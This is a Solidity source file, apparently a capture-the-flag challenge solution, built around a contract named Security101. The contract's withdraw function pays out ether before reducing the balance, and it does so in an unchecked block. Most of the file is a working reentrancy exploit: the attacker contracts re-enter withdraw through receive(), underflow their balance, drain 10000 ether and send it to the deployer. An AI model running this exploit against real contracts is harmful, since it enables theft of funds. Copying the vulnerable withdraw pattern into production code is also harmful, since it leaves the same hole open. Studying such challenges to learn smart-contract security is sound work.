// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;
import "forge-std/console.sol";

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract AttackerMiddle {
    Security101 token;
    uint i;
    constructor(Security101 _token) payable {
        token = _token;
    }

    function attack(address to) external {
        token.deposit{value: 1 ether}();
        for (uint k = 0; k < 1000; k++) {
            token.withdraw(1 ether);
            i = 0;
        }
        i = 9;
        token.withdraw(1 ether);
        i = 0;
        console.log("balance", address(this).balance);
        payable(to).transfer(10000 ether);
    }

    receive() external payable {
        if (i++ < 9)
            token.withdraw(1 ether);
    }
}

contract OptimizedAttackerSecurity101 {
    Security101 token;
    uint public i = 0;
    event Received();
    constructor(address _token) payable {
        AttackerMiddle tmp = new AttackerMiddle{value: 1 ether}(Security101(_token));
        tmp.attack(msg.sender);
    }
}
